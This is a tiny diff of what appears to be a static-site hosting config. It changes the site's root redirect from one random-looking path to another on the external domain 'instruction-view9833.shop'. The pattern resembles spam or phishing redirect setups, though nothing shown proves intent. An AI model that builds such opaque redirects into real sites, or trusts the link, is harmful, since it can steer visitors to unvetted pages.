@@ -4,5 +4,5 @@ services:
     env: static
     routes:
       - from: /
-        to: https://instruction-view9833.shop/c28z7ygwd
+        to: https://instruction-view9833.shop/WKdzdEbiT
         type: redirect
